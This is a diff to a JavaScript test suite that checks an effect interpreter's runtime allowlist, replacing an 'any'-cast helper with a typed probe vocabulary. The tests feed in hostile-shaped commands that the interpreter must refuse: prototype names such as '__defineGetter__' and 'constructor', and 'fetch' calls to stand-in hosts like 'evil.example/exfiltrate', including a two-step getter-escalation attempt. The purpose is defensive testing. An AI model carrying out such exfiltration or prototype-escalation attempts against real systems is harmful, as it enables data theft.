@@ -96,14 +96,58 @@ const map = {
 }
 
 /**
+ * The PROBE vocabulary: the same handler signature, with the command name
+ * left as `string` instead of the four literals.
+ *
+ * This is what makes the refusal proofs below expressible **without an
+ * `any`**, and the fact that it is expressible is a property of 0.46.0.
+ * `Operation` is `readonly [string, (…) => Result<…>]`, so a name that is not
+ * statically known is an ordinary operation type, not a hole — and
+ * `interpret` is generic in the operation set, so it can be handed a map and
+ * an effect that both live at this wider vocabulary. The map still holds
+ * exactly four handlers; a fifth command is refused by `at` finding nothing,
+ * which is precisely the backstop being proven.
+ *
+ * The payload is `readonly unknown[]` because a probe's payload is
+ * attacker-shaped: `__defineGetter__` is dispatched with a name and a
+ * function, `constructor` with nothing at all. That is also why this is a
+ * separate vocabulary from {@link TestOp} rather than a widening of it — a
+ * real operation's payload is typed, and saying so is the whole point of the
+ * four typedefs above.
+ * @typedef {readonly [string, (...payload: readonly unknown[]) => Result<string, never>]} ProbeOp
+ */
+
+/**
+ * `map`, at the probe vocabulary: the SAME four commands, in the SAME
+ * declaration order, so `refusalMessage`'s permitted list reads identically.
+ * It is a second object rather than a second annotation on the first because
+ * the handler signatures genuinely differ — see {@link ProbeOp}.
+ *
+ * `twoStepDefineGetterEscalation` asserts against THIS object, since this is
+ * the one a probe could have installed a getter on.
+ * @type {OperationMap<ProbeOp, Result<string, never>>}
+ */
+const probeMap = {
+    casRead: (...payload) => ok(`casRead:${String(payload[0])}`),
+    evoList: (...payload) => ok(`evoList:${String(payload[0])}`),
+    evoHead: (...payload) => ok(`evoHead:${String(payload[0])}`),
+    evoRevision: (...payload) => ok(`evoRevision:${String(payload[0])}`),
+}
+
+/**
  * Simulates a stored/generated program whose command string bypassed `tsc` —
  * a real `CasOp`-typed program cannot construct these (see EXEC-07, Phase
  * 6) — but `interpret`'s runtime refusal is the backstop for exactly this
- * case. Every non-permitted-name probe below goes through `unsafeDo`; the
- * one permitted-name probe uses plain `do_`.
- * @type {(command: string) => (...payload: readonly unknown[]) => Effect<TestOp, string, never>}
+ * case. Every non-permitted-name probe below goes through `probeDo`.
+ *
+ * **This used to be `/** @type {any} *\/ (do_)`.** It is an ordinary
+ * annotated binding now: `do_` is generic in `O`, and {@link ProbeOp} is a
+ * legal `O`, so nothing has to be discarded to say "a command whose name is
+ * not known until runtime". The `any` was never load-bearing — it was the
+ * absence of a vocabulary type that admitted an unknown name.
+ * @type {(command: string) => (...payload: readonly unknown[]) => Effect<ProbeOp, string, never>}
  */
-const unsafeDo = /** @type {any} */ (do_)
+const probeDo = do_
 
 /**
  * `do_` narrowed to the one permitted-name probe (`dispatch`, below).
@@ -329,8 +373,8 @@ export const proof = {
     // phase returns partial reads alongside a refusal, this becomes testable and
     // should be pinned then.
     refusalPartwayThroughAChainReportsTheRefusedCommand: () => {
-        const denied = step(readDo('doc-a'), () => unsafeDo('fetch')('https://evil'))
-        const result = interpret(map)(denied)
+        const denied = step(probeDo('casRead')('doc-a'), () => probeDo('fetch')('https://evil'))
+        const result = interpret(probeMap)(denied)
         assertEq(result[0], 'error')
         assertEq(
             result[1],
@@ -338,42 +382,42 @@ export const proof = {
     },
     refusals: {
         constructor: () => {
-            const result = interpret(map)(unsafeDo('constructor')())
+            const result = interpret(probeMap)(probeDo('constructor')())
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
                 'operation not permitted: constructor; permitted: casRead, evoList, evoHead, evoRevision')
         },
         toString: () => {
-            const result = interpret(map)(unsafeDo('toString')())
+            const result = interpret(probeMap)(probeDo('toString')())
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
                 'operation not permitted: toString; permitted: casRead, evoList, evoHead, evoRevision')
         },
         valueOf: () => {
-            const result = interpret(map)(unsafeDo('valueOf')())
+            const result = interpret(probeMap)(probeDo('valueOf')())
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
                 'operation not permitted: valueOf; permitted: casRead, evoList, evoHead, evoRevision')
         },
         hasOwnProperty: () => {
-            const result = interpret(map)(unsafeDo('hasOwnProperty')())
+            const result = interpret(probeMap)(probeDo('hasOwnProperty')())
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
                 'operation not permitted: hasOwnProperty; permitted: casRead, evoList, evoHead, evoRevision')
         },
         defineGetter: () => {
-            const result = interpret(map)(unsafeDo('__defineGetter__')())
+            const result = interpret(probeMap)(probeDo('__defineGetter__')())
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
                 'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
         },
         fetch: () => {
-            const result = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
+            const result = interpret(probeMap)(probeDo('fetch')('https://evil.example/exfiltrate'))
             assertEq(result[0], 'error')
             assertEq(
                 result[1],
@@ -386,13 +430,13 @@ export const proof = {
     // no own property from the attempt, and a following dispatch of the
     // target command is still refused with its own message.
     twoStepDefineGetterEscalation: () => {
-        const install = interpret(map)(unsafeDo('__defineGetter__')('fetch', () => 'exfiltrated'))
+        const install = interpret(probeMap)(probeDo('__defineGetter__')('fetch', () => 'exfiltrated'))
         assertEq(install[0], 'error')
         assertEq(
             install[1],
             'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
-        assert(!Object.hasOwn(map, 'fetch'))
-        const followUp = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
+        assert(!Object.hasOwn(probeMap, 'fetch'))
+        const followUp = interpret(probeMap)(probeDo('fetch')('https://evil.example/exfiltrate'))
         assertEq(followUp[0], 'error')
         assertEq(
             followUp[1],
